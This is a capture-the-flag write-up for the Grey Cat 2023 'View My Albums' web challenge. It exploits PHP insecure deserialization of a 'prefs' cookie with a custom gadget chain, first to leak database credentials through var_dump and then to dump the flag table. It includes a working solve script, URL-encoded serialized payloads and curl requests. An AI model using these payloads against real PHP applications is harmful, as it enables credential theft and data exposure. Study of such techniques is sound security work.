# View My Albums

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- 36 solves / 280 points
- Overall difficulty for me (From 1-10 stars): ★★★★★★★☆☆☆

## Background

My RateYourMusic competitor will take off any day now. I just need to add rating... and CSS... and images... and a bunch of other things

[http://34.124.157.94:10555/](http://34.124.157.94:10555/)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Grey-Cat-The-Flag-2023-Qualifiers/images/Pasted%20image%2020230521224150.png)

In here, we can view some albums:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Grey-Cat-The-Flag-2023-Qualifiers/images/Pasted%20image%2020230521224241.png)

When we clicked one of those albums, it'll go to `/` with GET parameter `id`, and it'll show that specific ID album's details.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Grey-Cat-The-Flag-2023-Qualifiers/Web/View-My-Albums/view-my-albums-dist.zip):**
```shell
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/View-My-Albums)-[2023.05.21|22:44:07(HKT)]
└> file view-my-albums-dist.zip 
view-my-albums-dist.zip: Zip archive data, at least v2.0 to extract, compression method=store
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/View-My-Albums)-[2023.05.21|22:44:10(HKT)]
└> unzip view-my-albums-dist.zip 
Archive:  view-my-albums-dist.zip
   creating: dist/
  inflating: dist/.env               
  inflating: dist/albums.sql         
  inflating: dist/docker-compose.yml  
  inflating: dist/Dockerfile         
   creating: dist/src/
  inflating: dist/src/Albums.php     
  inflating: dist/src/db_creds.php   
   creating: dist/src/greetings/
 extracting: dist/src/greetings/de   
 extracting: dist/src/greetings/en   
 extracting: dist/src/greetings/fr   
  inflating: dist/src/index.php      
  inflating: dist/src/Records.php    
```

**After reading through the source code, we can see this PHP code stands out:**
```php
<?php

include('Albums.php');
include('db_creds.php');

class UserPrefs {
    private $props = array();
    public $font_size;
    public $font_color;
    public $background_color;
    public $language;
    public $timezone;
    
    public function __set($name, $value) {
        $this->props[$name] = $value;
    }
    
    public function __get($name) {
        return $this->props[$name];
    }
    
}
[...]
if (isset($_COOKIE['prefs'])) {
    $prefs = unserialize($_COOKIE['prefs']);
    if (!($prefs instanceof UserPrefs)) {
        echo "Unrecognized data: ";
        var_dump($prefs);
        exit;
    }
} else {
    $prefs = new UserPrefs();
    $prefs->font_size = "medium";
    $prefs->font_color = "black";
    $prefs->background_color = "white";
    $prefs->language = "en";
    $prefs->timezone = "UTC";
    $prefs->frob_enabled = true;
    $prefs->frob_level = 11;
    setcookie("prefs", serialize($prefs));
}
```

If there's a cookie called `prefs`, it'll ***unserialize (deserialize) that cookie's value***. Then, if the unserialized object data is not an instance of class `UserPrefs`, **it'll use `var_dump()` to display the unserialized cookie's value.**

If no `prefs` cookie, it'll set a new `prefs` cookie with the value of serialized `$prefs` object instance.

That being said, we're dealing with a ***PHP insecure deserialization***.

> Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code. (From [https://portswigger.net/web-security/deserialization](https://portswigger.net/web-security/deserialization))

Therefore, we now need to develop a **custom gadget** for PHP deserialization.

> A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. An individual gadget may not directly do anything harmful with user input. However, the attacker's goal might simply be to invoke a method that will pass their input into another gadget. By chaining multiple gadgets together in this way, an attacker can potentially pass their input into a dangerous "sink gadget", where it can cause maximum damage. (From [https://portswigger.net/web-security/deserialization/exploiting](https://portswigger.net/web-security/deserialization/exploiting))

**In `albums.sql`, we can see that the flag is being inserted into table `flag`:**
```sql
[...]
CREATE TABLE `flag` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `flag` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4;

INSERT INTO `flag`
VALUES (1,'REDACTED', '2020-05-01 00:00:00','2020-05-01 00:00:00');
```

With that said, we need to somehow retrieve table `flag`'s data.

**In `src/Records.php`, we can see there's a `MysqlRecordStore` class, which has interface `RecordStore`:**
```php
interface RecordStore
{
    public function getRecord($id);
    public function addRecord($record);
    public function updateRecord($id, $record);
    public function deleteRecord($id);
    public function getAllRecords();
}
[...]
class MysqlRecordStore implements RecordStore
{
    private $mysqli;
    private $table;
    private $host;
    private $user;
    private $pass;
    private $db;

    public function __construct($host, $user, $pass, $db, $table) {
        $this->host = $host;
        $this->user = $user;
        $this->pass = $pass;
        $this->db = $db;
        $this->mysqli = new mysqli($host, $user, $pass, $db);
        $this->table = $table;
    }
    [...]
    public function getAllRecords() {
        $stmt = $this->mysqli->prepare("SELECT * FROM {$this->table}");
        $stmt->execute();
        $rows = $stmt->get_result()->fetch_all(MYSQLI_ASSOC);
        $records = array();
        foreach ($rows as $row) {
            $record = new Record($row['id']);
            foreach ($row as $key => $value) {
                $record->$key = $value;
            }
            $records[] = $record;
        }
        return $records;
    }
    [...]
}
```

In class `MysqlRecordStore`, there's a method called `getAllRecords()`, and **it'll retrieve all the records from a specific table**, based on `MysqlRecordStore`'s object instance's `table` attribute.

> Note: When initializing class `MysqlRecordStore`, we need to provide 5 arguments: `$host`, `$user`, `$pass`, `$db`, `$table`.

**Also, in `src/index.php`, we can see how the class `MysqlRecordStore` is being initialized:**
```php
$albums = new Albums(new MysqlRecordStore($mysql_host, $mysql_user, $mysql_password, $mysql_database, 'albums'));
```

Hmm... It's initializing `Albums` class, with the `MysqlRecordStore` class.

Let's take a look at the `Albums` class.

**In `src/Albums.php`, we see this:**
```php
<?php
include('Records.php');

class Albums {
    private $store;

    public function __construct($store) {
        $this->store = $store;
    }
    [...]
    public function getAllAlbums() {
        return $this->store->getAllRecords();
    }

    public function __debugInfo() {
        return $this->getAllAlbums();
    }
}
```

This `Albums` class is initializing with a `store` attribute.

The `getAllAlbums()` method will take the `store` attribute to invoke `getAllRecords()` method. So basically the `store` attribute is classes from `src/Records.php`, like class `MysqlRecordStore`.

**And uhh... What does that `__debugInfo()` magic method do?**

> This method is called by [`var_dump()`](https://www.php.net/manual/en/function.var-dump.php) when dumping an object to get the properties that should be shown. If the method isn't defined on an object, then all public, protected and private properties will be shown. (From [https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo](https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo))

**Ah ha! `var_dump()` in `src/index.php`!**
```php
if (isset($_COOKIE['prefs'])) {
    $prefs = unserialize($_COOKIE['prefs']);
    if (!($prefs instanceof UserPrefs)) {
        echo "Unrecognized data: ";
        var_dump($prefs);
        exit;
    }
} else {
    [...]
```

Hence, **we need to purposefully `unserialize()` our `prefs` cookie without being the instance of class `UserPrefs`!**

**Now, before we generate a custom gadget chain, we're missing something:**
```php
$getFlag = new Albums(new MysqlRecordStore("host???", "username???", "password???", "database_name???", "flag"));
$serializedgetFlag = urlencode(serialize($getFlag));
echo "[+] Serialized get flag: $serializedgetFlag\n";
```

**In `src/db_creds.php`, we can see MySQL configuration:**
```php
<?php

$mysql_host = 'mysql';
$mysql_database = 'challenge';
$mysql_user = 'user';
$mysql_password = 'yeah_im_different';
```

> Note: The `$mysql_password` will be different on the challenge machine, the above one is for local testing.

Umm... Can we leak those configuration?

After poking around at the `src/Records.php`, we can see there's a method is interesting to us.

**In class `JsonRecordStore`, it initializes an attribute called `file`:**
```php
class JsonRecordStore implements RecordStore
{
    private $file;

    public function __construct($file) {
        $this->file = $file;
    }
    [...]
    public function getAllRecords() {
        $data = json_decode(file_get_contents($this->file), true);
        $records = array();
        foreach ($data as $id => $row) {
            $record = new Record($id);
            foreach ($row as $key => $value) {
                $record->$key = $value;
            }
            $records[] = $record;
        }
        return $records;
    }
}
```

That attribute can be used in `getAllRecords()` method. When this method is called, it'll fetch the file contents from the `file` attribute.

**How can we call it? You guessed! The `__debugInfo()` magic method in class `Albums`!**
```php
class Albums {
    [...]
    public function __debugInfo() {
        return $this->getAllAlbums();
    }
}
```

So! We can initialize the `JsonRecordStore` class, with attribute `db_creds.php` to leak the MySQL configuration, right?

**No! Take a closer look to the `$data` variable:**
```php
$data = json_decode(file_get_contents($this->file), true);
```

When the file's contents are fetched, it'll JSON decode it. However, the `db_creds.php` file's content is NOT JSON data, so it won't work.

**Luckly, we can solve that problem via leveraging the `CsvRecordStore` class:**
```php
class CsvRecordStore implements RecordStore
{
    private $file;

    public function __construct($file) {
        $this->file = $file;
    }
    [...]
    public function getAllRecords() {
        $data = array_map('str_getcsv', file($this->file));
        $records = array();
        foreach ($data as $id => $row) {
            $record = new Record($id);
            foreach ($row as $key => $value) {
                $record->$key = $value;
            }
            $records[] = $record;
        }
        return $records;
    }
}
```

Although the initialization is the same as the `JsonRecordStore` class, **method `getAllRecords()` is different!**

```php
$data = array_map('str_getcsv', file($this->file));
```

> **`array_map()`** returns an array containing the results of applying the `callback` to the corresponding value of `array` (and `arrays` if more arrays are provided) used as arguments for the callback. The number of parameters that the `callback` function accepts should match the number of arrays passed to **`array_map()`**. (From [https://www.php.net/manual/en/function.array-map.php](https://www.php.net/manual/en/function.array-map.php))
>   
>  `str_getcsv` — Parse a CSV string into an array (From [https://www.php.net/manual/en/function.str-getcsv.php](https://www.php.net/manual/en/function.str-getcsv.php))

**Hence, we can use class `CsvRecordStore` to leak the MySQL configuration!**

## Exploitation

Armed with above information, we need to:

- Leak MySQL configuration via unserializing object instance `Albums()` with object instance `CsvRecordStore("db_creds.php")`. The configuration will be leaked via `var_dump()` when the instance of `prefs` cookie's value is not equal to class `UserPrefs`
- Get the flag via unserializing object instance `Albums()` with object instance `MysqlRecordStore("leaked_host", "leaked_username", "leaked_password", "leaked_database_name", "flag")`

**To do so, I'll write a PHP script:**
```php
<?php
class Albums {
    private $store;

    public function __construct($store) {
        $this->store = $store;
    }
}

class CsvRecordStore
{
    private $file;

    public function __construct($file) {
        $this->file = $file;
    }
}

function sendRequest($serializedObjectInURLEncoding)
{
    $url = "http://34.124.157.94:10555/";
    $cookie = "prefs=$serializedObjectInURLEncoding";
    $options = array(
    'http' => array(
            'header' => "Cookie: $cookie\r\n",
        ),
    );
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);
    echo "[+] Response: \n$response";
}

$leakMySQLConfiguration = new Albums(new CsvRecordStore("db_creds.php"));
$serializedLeakMySQLConfiguration = urlencode(serialize($leakMySQLConfiguration));
echo "[+] Serialized leak MySQL configuration object in URL encoding: $serializedLeakMySQLConfiguration\n";

echo "[+] Sending the serialized leak MySQL configuration object\n";
sendRequest($serializedLeakMySQLConfiguration)
?>
```

**Output:**
```shell
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/View-My-Albums)-[2023.05.22|00:03:54(HKT)]
└> php solve.php
[+] Serialized leak MySQL configuration object in URL encoding: O%3A6%3A%22Albums%22%3A1%3A%7Bs%3A13%3A%22%00Albums%00store%22%3BO%3A14%3A%22CsvRecordStore%22%3A1%3A%7Bs%3A20%3A%22%00CsvRecordStore%00file%22%3Bs%3A12%3A%22db_creds.php%22%3B%7D%7D
[+] Sending the serialized leak MySQL configuration object
[+] Response: 
Unrecognized data: object(Albums)#1 (6) {
  [0]=>
  object(Record)#3 (1) {
    ["data":"Record":private]=>
    array(2) {
      ["id"]=>
      int(0)
      [0]=>
      string(5) "<?php"
    }
  }
  [1]=>
  object(Record)#4 (1) {
    ["data":"Record":private]=>
    array(2) {
      ["id"]=>
      int(1)
      [0]=>
      NULL
    }
  }
  [2]=>
  object(Record)#5 (1) {
    ["data":"Record":private]=>
    array(2) {
      ["id"]=>
      int(2)
      [0]=>
      string(22) "$mysql_host = 'mysql';"
    }
  }
  [3]=>
  object(Record)#6 (1) {
    ["data":"Record":private]=>
    array(2) {
      ["id"]=>
      int(3)
      [0]=>
      string(30) "$mysql_database = 'challenge';"
    }
  }
  [4]=>
  object(Record)#7 (1) {
    ["data":"Record":private]=>
    array(2) {
      ["id"]=>
      int(4)
      [0]=>
      string(21) "$mysql_user = 'user';"
    }
  }
  [5]=>
  object(Record)#8 (1) {
    ["data":"Record":private]=>
    array(2) {
      ["id"]=>
      int(5)
      [0]=>
      string(40) "$mysql_password = 'j90dsgjdjds09djvupx';"
    }
  }
}
```

Nice! We successfully leaked the challenge instance's MySQL configuration!

- Host: `mysql`
- Database name: `challenge`
- Username: `user`
- **Password: `j90dsgjdjds09djvupx`**

**Let's get the flag!**
```php
class Albums {
    private $store;

    public function __construct($store) {
        $this->store = $store;
    }
}

class MysqlRecordStore
{
    private $mysqli;
    private $table;
    private $host;
    private $user;
    private $pass;
    private $db;

    public function __construct($host, $user, $pass, $db, $table) {
        $this->host = $host;
        $this->user = $user;
        $this->pass = $pass;
        $this->db = $db;
        $this->mysqli = new mysqli($host, $user, $pass, $db);
        $this->table = $table;
    }
}

$getFlag = new Albums(new MysqlRecordStore("mysql", "user", "j90dsgjdjds09djvupx", "challenge", "flag"));
$serializedgetFlag = urlencode(serialize($getFlag));
echo "[+] Serialized get flag object in URL encoding: $serializedgetFlag\n";
```

**However, when we run that, it'll not work:**
```shell
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/View-My-Albums)-[2023.05.22|00:10:54(HKT)]
└> php solve.php
PHP Warning:  mysqli::__construct(): php_network_getaddresses: getaddrinfo for mysql failed: Name or service not known in /home/siunam/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/View-My-Albums/solve.php on line 24
PHP Fatal error:  Uncaught mysqli_sql_exception: php_network_getaddresses: getaddrinfo for mysql failed: Name or service not known in /home/siunam/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/View-My-Albums/solve.php:24
Stack trace:
#0 /home/siunam/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/View-My-Albums/solve.php(24): mysqli->__construct()
#1 /home/siunam/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/View-My-Albums/solve.php(59): MysqlRecordStore->__construct()
#2 {main}
  thrown in /home/siunam/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/View-My-Albums/solve.php on line 24
```

If you take a closer look at the error, you'll see `getaddrinfo for mysql failed: Name or service not known`. Ahh... That makes sense, as we're reaching out to `mysql` host, which doesn't exist in here.

**To generate the serialized get flag object in URL encoding, we can:**

- Build and run the container locally via `docker-compose`:

```shell
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/View-My-Albums/dist)-[2023.05.21|22:34:26(HKT)]
└> sudo docker-compose up     
[...]
```

- Get an interactive shell in the PHP container:

```shell
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/View-My-Albums/dist)-[2023.05.21|22:33:54(HKT)]
└> sudo docker ps
CONTAINER ID   IMAGE                     COMMAND                  CREATED         STATUS         PORTS                                                  NAMES
fc7b7b7af007   ifpb/php:7.3-apache-pdo   "docker-php-entrypoi…"   4 seconds ago   Up 2 seconds   0.0.0.0:8080->80/tcp, :::8080->80/tcp                  web
8a851d1f2389   mysql:8.0                 "docker-entrypoint.s…"   2 minutes ago   Up 2 minutes   0.0.0.0:3306->3306/tcp, :::3306->3306/tcp, 33060/tcp   mysql
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/View-My-Albums/dist)-[2023.05.21|22:35:30(HKT)]
└> sudo docker exec -it fc7b7b7af007 /bin/bash
root@fc7b7b7af007:/var/www/html# 
```

- Copy the above get the flag PHP script to the container:

```shell
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/View-My-Albums)-[2023.05.21|22:40:05(HKT)]
└> sudo docker cp solve.php fc7b7b7af007:/var/www/html/solve.php
```

- Run the script:

```shell
root@fc7b7b7af007:/var/www/html# php solve.php 

Warning: mysqli::__construct(): (HY000/1045): Access denied for user 'user'@'172.28.0.3' (using password: YES) in /var/www/html/solve.php on line 24
[+] Serialized get flag object in URL encoding: O%3A6%3A%22Albums%22%3A1%3A%7Bs%3A13%3A%22%00Albums%00store%22%3BO%3A16%3A%22MysqlRecordStore%22%3A6%3A%7Bs%3A24%3A%22%00MysqlRecordStore%00mysqli%22%3BO%3A6%3A%22mysqli%22%3A19%3A%7Bs%3A13%3A%22affected_rows%22%3BN%3Bs%3A11%3A%22client_info%22%3BN%3Bs%3A14%3A%22client_version%22%3BN%3Bs%3A13%3A%22connect_errno%22%3BN%3Bs%3A13%3A%22connect_error%22%3BN%3Bs%3A5%3A%22errno%22%3BN%3Bs%3A5%3A%22error%22%3BN%3Bs%3A10%3A%22error_list%22%3BN%3Bs%3A11%3A%22field_count%22%3BN%3Bs%3A9%3A%22host_info%22%3BN%3Bs%3A4%3A%22info%22%3BN%3Bs%3A9%3A%22insert_id%22%3BN%3Bs%3A11%3A%22server_info%22%3BN%3Bs%3A14%3A%22server_version%22%3BN%3Bs%3A4%3A%22stat%22%3BN%3Bs%3A8%3A%22sqlstate%22%3BN%3Bs%3A16%3A%22protocol_version%22%3BN%3Bs%3A9%3A%22thread_id%22%3BN%3Bs%3A13%3A%22warning_count%22%3BN%3B%7Ds%3A23%3A%22%00MysqlRecordStore%00table%22%3Bs%3A4%3A%22flag%22%3Bs%3A22%3A%22%00MysqlRecordStore%00host%22%3Bs%3A5%3A%22mysql%22%3Bs%3A22%3A%22%00MysqlRecordStore%00user%22%3Bs%3A4%3A%22user%22%3Bs%3A22%3A%22%00MysqlRecordStore%00pass%22%3Bs%3A19%3A%22j90dsgjdjds09djvupx%22%3Bs%3A20%3A%22%00MysqlRecordStore%00db%22%3Bs%3A9%3A%22challenge%22%3B%7D%7D
```

**Nice! We got the serialized object! Let's send it!**
```shell
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/View-My-Albums)-[2023.05.22|00:19:01(HKT)]
└> curl http://34.124.157.94:10555/ --cookie "prefs=O%3A6%3A%22Albums%22%3A1%3A%7Bs%3A13%3A%22%00Albums%00store%22%3BO%3A16%3A%22MysqlRecordStore%22%3A6%3A%7Bs%3A24%3A%22%00MysqlRecordStore%00mysqli%22%3BO%3A6%3A%22mysqli%22%3A19%3A%7Bs%3A13%3A%22affected_rows%22%3BN%3Bs%3A11%3A%22client_info%22%3BN%3Bs%3A14%3A%22client_version%22%3BN%3Bs%3A13%3A%22connect_errno%22%3BN%3Bs%3A13%3A%22connect_error%22%3BN%3Bs%3A5%3A%22errno%22%3BN%3Bs%3A5%3A%22error%22%3BN%3Bs%3A10%3A%22error_list%22%3BN%3Bs%3A11%3A%22field_count%22%3BN%3Bs%3A9%3A%22host_info%22%3BN%3Bs%3A4%3A%22info%22%3BN%3Bs%3A9%3A%22insert_id%22%3BN%3Bs%3A11%3A%22server_info%22%3BN%3Bs%3A14%3A%22server_version%22%3BN%3Bs%3A4%3A%22stat%22%3BN%3Bs%3A8%3A%22sqlstate%22%3BN%3Bs%3A16%3A%22protocol_version%22%3BN%3Bs%3A9%3A%22thread_id%22%3BN%3Bs%3A13%3A%22warning_count%22%3BN%3B%7Ds%3A23%3A%22%00MysqlRecordStore%00table%22%3Bs%3A4%3A%22flag%22%3Bs%3A22%3A%22%00MysqlRecordStore%00host%22%3Bs%3A5%3A%22mysql%22%3Bs%3A22%3A%22%00MysqlRecordStore%00user%22%3Bs%3A4%3A%22user%22%3Bs%3A22%3A%22%00MysqlRecordStore%00pass%22%3Bs%3A19%3A%22j90dsgjdjds09djvupx%22%3Bs%3A20%3A%22%00MysqlRecordStore%00db%22%3Bs%3A9%3A%22challenge%22%3B%7D%7D"
Unrecognized data: object(Albums)#1 (1) {
  [0]=>
  object(Record)#5 (1) {
    ["data":"Record":private]=>
    array(4) {
      ["id"]=>
      int(1)
      ["flag"]=>
      string(29) "grey{l4_mu5iCA_DE_haIry_FroG}"
      ["created_at"]=>
      string(19) "2020-05-01 00:00:00"
      ["updated_at"]=>
      string(19) "2020-05-01 00:00:00"
    }
  }
}
```

- **Flag: `grey{l4_mu5iCA_DE_haIry_FroG}`**
- Credits: @7777777

## Conclusion

What we've learned:

1. Exploiting PHP Insecure Deserialization With Custom Gadget Chain